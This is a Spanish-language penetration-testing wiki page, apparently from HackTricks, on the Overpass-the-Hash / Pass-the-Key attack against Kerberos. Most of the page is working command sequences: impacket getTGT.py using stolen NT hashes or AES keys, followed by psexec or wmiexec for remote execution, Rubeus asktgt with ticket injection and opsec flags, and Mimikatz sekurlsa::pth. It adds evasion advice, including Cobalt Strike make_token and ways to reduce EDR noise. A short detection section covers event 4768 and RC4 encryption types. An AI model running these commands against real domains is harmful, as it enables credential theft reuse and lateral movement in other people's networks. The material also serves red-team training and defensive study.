# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

El ataque **Overpass The Hash/Pass The Key (PTK)** está diseñado para entornos en los que el protocolo NTLM tradicional está restringido y la autenticación Kerberos tiene prioridad. Este ataque utiliza el hash NTLM o las claves AES de un usuario para solicitar tickets Kerberos, lo que permite obtener acceso no autorizado a recursos dentro de una red.

En sentido estricto:

- **Over-Pass-the-Hash** normalmente significa convertir el **hash NT** en un TGT de Kerberos mediante la clave Kerberos **RC4-HMAC**.
- **Pass-the-Key** es la versión más genérica, en la que ya se dispone de una clave Kerberos como **AES128/AES256** y se solicita directamente un TGT con ella.

Esta diferencia es importante en entornos reforzados: si **RC4 está deshabilitado** o el KDC ya no lo da por supuesto, el **hash NT por sí solo no es suficiente** y se necesita una **clave AES** (o la contraseña en texto claro para derivarla).

Para ejecutar este ataque, el primer paso consiste en obtener el hash NTLM o la contraseña de la cuenta del usuario objetivo. Una vez obtenida esta información, se puede conseguir un Ticket Granting Ticket (TGT) para la cuenta, lo que permite al atacante acceder a servicios o máquinas para los que el usuario tiene permisos.

El proceso puede iniciarse con los siguientes comandos:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Para los escenarios que requieren AES256, se puede utilizar la opción `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` también permite solicitar directamente un **service ticket mediante un AS-REQ** con `-service <SPN>`, lo que puede ser útil cuando quieres un ticket para un SPN específico sin una solicitud TGS-REQ adicional:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Además, el ticket obtenido podría emplearse con varias herramientas, incluidas `smbexec.py` o `wmiexec.py`, ampliando el alcance del ataque.

Los problemas encontrados, como _PyAsn1Error_ o _KDC cannot find the name_, suelen resolverse actualizando la biblioteca Impacket o utilizando el nombre de host en lugar de la dirección IP, lo que garantiza la compatibilidad con el KDC de Kerberos.

Una secuencia de comandos alternativa mediante Rubeus.exe demuestra otra faceta de esta técnica:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Este método refleja el enfoque **Pass the Key**, centrándose en tomar el control del ticket y utilizarlo directamente con fines de autenticación. En la práctica:

- `Rubeus asktgt` envía directamente el **AS-REQ/AS-REP raw de Kerberos** y no necesita derechos de admin, a menos que quieras dirigirte a otra logon session con `/luid` o crear una independiente con `/createnetonly`.
- `mimikatz sekurlsa::pth` parchea el material de credenciales en una logon session y, por tanto, **accede a LSASS**, lo que normalmente requiere admin local o `SYSTEM` y genera más ruido desde la perspectiva de un EDR.

Ejemplos con Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Para cumplir con la seguridad operativa y usar AES256, se puede aplicar el siguiente comando:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` es relevante porque el tráfico generado por Rubeus difiere ligeramente del Kerberos nativo de Windows. Ten en cuenta también que `/opsec` está pensado para tráfico **AES256**; usarlo con RC4 normalmente requiere `/force`, lo que anula gran parte del objetivo porque **RC4 en dominios modernos ya es una señal clara**.

## Notas de detección

Cada solicitud de TGT genera el **evento `4768`** en el DC. En las versiones actuales de Windows, este evento contiene más campos útiles de los que mencionan los writeups antiguos:

- `TicketEncryptionType` indica qué enctype se utilizó para emitir el TGT. Los valores habituales son `0x17` para **RC4-HMAC**, `0x11` para **AES128** y `0x12` para **AES256**.<sup>[[3]](#references)</sup>
- Los eventos actualizados también exponen `SessionKeyEncryptionType`, `PreAuthEncryptionType` y los enctypes anunciados por el cliente, lo que ayuda a distinguir una **dependencia real de RC4** de los confusos valores predeterminados heredados.
- Ver `0x17` en un entorno moderno es un buen indicio de que la cuenta, el host o la ruta de fallback del KDC todavía permiten RC4 y, por tanto, son más favorables para Over-Pass-the-Hash basado en NT-hash.

Microsoft ha ido reduciendo progresivamente el comportamiento predeterminado de RC4 desde las actualizaciones de hardening de Kerberos de noviembre de 2022, y la guía publicada actualmente recomienda **eliminar RC4 como enctype asumido por defecto para los DCs de AD antes del final del Q2 de 2026**. Desde una perspectiva ofensiva, esto significa que **Pass-the-Key con AES** es cada vez más el camino fiable, mientras que el OpTH clásico **basado únicamente en NT-hash** seguirá fallando con mayor frecuencia en entornos hardened.<sup>[[3]](#references)</sup>

Para obtener más detalles sobre los tipos de cifrado de Kerberos y el comportamiento relacionado con los tickets, consulta:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Versión más sigilosa

> [!WARNING]
> Cada sesión de inicio de sesión solo puede tener un TGT activo a la vez, así que ten cuidado.

1. Crea una nueva sesión de inicio de sesión con **`make_token`** desde Cobalt Strike.
2. Después, utiliza Rubeus para generar un TGT para la nueva sesión de inicio de sesión sin afectar a la existente.

Puedes conseguir un aislamiento similar desde el propio Rubeus utilizando una sesión **logon type 9** sacrificable:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Esto evita sobrescribir el TGT de la sesión actual y suele ser más seguro que importar el ticket en tu sesión de logon existente.

## References

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Detect and Remediate RC4 Usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
